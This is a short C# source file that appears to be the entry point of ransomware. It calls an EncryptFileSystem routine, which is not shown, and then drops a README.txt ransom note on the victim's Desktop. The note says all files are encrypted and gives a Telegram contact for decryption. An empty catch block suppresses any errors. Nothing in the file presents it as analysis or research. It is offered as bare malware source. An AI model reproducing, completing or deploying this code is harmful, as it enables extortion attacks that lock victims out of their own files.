using System;
using System.IO;

internal static class Program
{
	[STAThread]
	private static void Main(string[] args)
	{
		try
		{
			Apana.EncryptFileSystem();
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\README.txt";
			string contents = "Hello. All your files are encrypted. Do you want to decrypt your files contact us Our Telegram: https://t.me/Poliex";
			File.WriteAllText(path, contents);
		}
		catch
		{
		}
	}
}
